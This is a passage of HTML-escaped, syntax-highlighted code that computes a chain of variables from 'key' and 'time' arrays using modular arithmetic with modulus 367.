    v54 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v52 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v53 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;]
    v56 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;]
    v57 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v56 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v54 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v59 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;]
    v61 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v57 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v59 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v62 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;]
    v64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v61 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v62 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v65 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;]
    v67 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v64 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v65 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v68 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;]
    v70 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v67 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v68 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v71 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;]
    v73 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v70 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v71 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v74 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;]
    v76 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v73 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v74 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v77 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;]
    v78 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v76 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v77 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v79 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;]
    v82 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;]
    v84 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v82 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((v79 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((((((v78 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;]
    v85 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;]
    v86 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((((v84 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (((((v84 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v87 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v86 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v85 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v89 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;]
    v90 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v89 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v87 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
